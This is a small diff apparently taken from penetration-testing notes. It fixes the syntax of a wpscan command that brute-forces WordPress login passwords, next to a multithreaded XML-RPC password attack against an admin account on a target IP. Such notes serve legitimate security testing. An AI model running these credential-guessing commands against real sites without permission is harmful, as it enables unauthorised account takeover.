@@ -78,7 +78,7 @@ Register for a free account and get an API token from https://wpscan.com/
 Bruteforce login page with wpscan   
 Xmlrpc method is usually faster (if enabled)       
 
-    wpscan –u ipaddress --usernames name_list --wordlist wordlist    
+    wpscan --url ipaddress --usernames name_list --passwords wordlist    
     wpscan --password-attack xmlrpc -t 20 -U admin, username -P passwords.txt --url http://10.10.10.10           
 
 
